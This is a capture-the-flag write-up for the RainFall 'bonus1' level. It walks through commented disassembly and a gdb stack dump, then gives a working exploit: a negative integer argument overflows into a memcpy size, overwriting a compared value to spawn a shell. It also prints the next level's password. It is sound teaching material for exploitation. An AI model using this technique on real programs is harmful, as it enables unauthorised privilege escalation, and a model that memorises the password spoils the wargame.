[README](../README.md)
# bonus 1

```
bonus1@RainFall:~$ ./bonus1 
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 a
```
The program expect at least 1 argument
## Disassembly

```
0x08048424 <+0>:	push   %ebp
0x08048425 <+1>:	mov    %esp,%ebp
0x08048427 <+3>:	and    $0xfffffff0,%esp
0x0804842a <+6>:	sub    $0x40,%esp           // Allocate 64 bytes on the stack
0x0804842d <+9>:	mov    0xc(%ebp),%eax       // Get the 1st arg - argv[0]
0x08048430 <+12>:	add    $0x4,%eax            // move the address to argv[1]
0x08048433 <+15>:	mov    (%eax),%eax          // dereference argv[1] and store it value in eax
0x08048435 <+17>:	mov    %eax,(%esp)
0x08048438 <+20>:	call   0x8048360 <atoi@plt> // call atoi with eax value moved to the top of the stack
0x0804843d <+25>:	mov    %eax,0x3c(%esp)      // move the return value of atoi at on offset of 0x3c from esp 
0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)      // compare (less) this value to 9 decimal
0x08048446 <+34>:	jle    0x804844f <main+43>  // if argv[1] <= 9 then jumps
0x08048448 <+36>:	mov    $0x1,%eax            // return value = 1
0x0804844d <+41>:	jmp    0x80484a3 <main+127> // otherwise go the end of main function
0x0804844f <+43>:	mov    0x3c(%esp),%eax      // move atoi(argv[1]) into eax 
0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx    // ecx = 4 * eax
0x0804845a <+54>:	mov    0xc(%ebp),%eax       // move the addr 0xc above ebp into eax
0x0804845d <+57>:	add    $0x8,%eax            // add 0x8 to eax
0x08048460 <+60>:	mov    (%eax),%eax          // dereference eax
0x08048462 <+62>:	mov    %eax,%edx            // edx = eax
0x08048464 <+64>:	lea    0x14(%esp),%eax      // ax = esp + 0x14 (destination address for memcpy)
0x08048468 <+68>:	mov    %ecx,0x8(%esp)       // move ecx to offset 0x8 from esp (size parameter for memcpy)
0x0804846c <+72>:	mov    %edx,0x4(%esp)       // move edx to offset 0x4 from esp (source address for memcpy)
0x08048470 <+76>:	mov    %eax,(%esp)          // move eax to the top of the stack (destination address for memcpy)
0x08048473 <+79>:	call   0x8048320 <memcpy@plt>   // memcpy(dest = 0x14(esp) , source = edx, num = ecx)
0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)   // compare a constant value to the result of atoi(argv[1])
0x08048480 <+92>:	jne    0x804849e <main+122>     // if not equal, jump to the failure condition
0x08048482 <+94>:	movl   $0x0,0x8(%esp)           // set argument 3 of execl to 0 (end of arguments)
0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)     // set argument 2 of execl to "/bin/sh"
0x08048492 <+110>:	movl   $0x8048583,(%esp)        // set argument 1 of execl to "sh"
0x08048499 <+117>:	call   0x8048350 <execl@plt>    // execl("/bin/sh", "sh", 0)
0x0804849e <+122>:	mov    $0x0,%eax                // return value = 0
0x080484a3 <+127>:	leave  
0x080484a4 <+128>:	ret  
```


## Exploit
The first condition requires `atoi(argv[1])` to be less than 10.
- we can use any negative integer

Later the value of `atoi(argv[1])` will be multiplied by 4 and used as `n` parameter of `memcpy` giving the amount of bytes to copy.

The last condition check if the value of `atoi(argv[1])` is strictly equal to `0x574f4c46` -> decimal 1464814662

The buffer size used for the destination string of memcpy can be calculated:
- `0x14(%esp)` is used as the destination address for the memcpy function. This means that str starts at an offset of 0x14 from the esp register.
-  Since the stack frame size is `0x40` bytes `(sub $0x40,%esp)`, and str starts at an offset of 0x14, we can calculate the size of str as `0x40 - 0x14 = 0x2C` bytes -> 44 in decimal

```
(gdb) run 9 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x08048326 in memcpy@plt ()
(gdb) finish
Run till exit from #0  0x08048326 in memcpy@plt ()
0x08048478 in main ()
(gdb) x/30w $esp
0xbffff6b0:     0xbffff6c4      0xbffff8d0      0x00000024      0x080482fd
0xbffff6c0:     0xb7fd13e4      0x61616161      0x61616161      0x61616161
0xbffff6d0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff6e0:     0x61616161      0x61616161      0x080484b9      0x00000009
0xbffff6f0:     0x080484b0      0x00000000      0x00000000      0xb7e454d3
```
Using 9*4 in `memcpy` we fill the str with only `a` char `61 ASCII`
Our int contains the value `0x00000009` and is located 40 bytes after the start of our string buffer.
The size of the buffer is 40 bytes.

The str is above the stored int value, if we can use `memcpy` with 44 bytes we can overwrite the value of the int.

We need to be able to copy 44 bytes, the value of `argv[1]` should be:
`-2147483637` which will give us 44 when multiplied by 4.

```
./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ pwd
/home/user/bonus1
$ cd ../bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```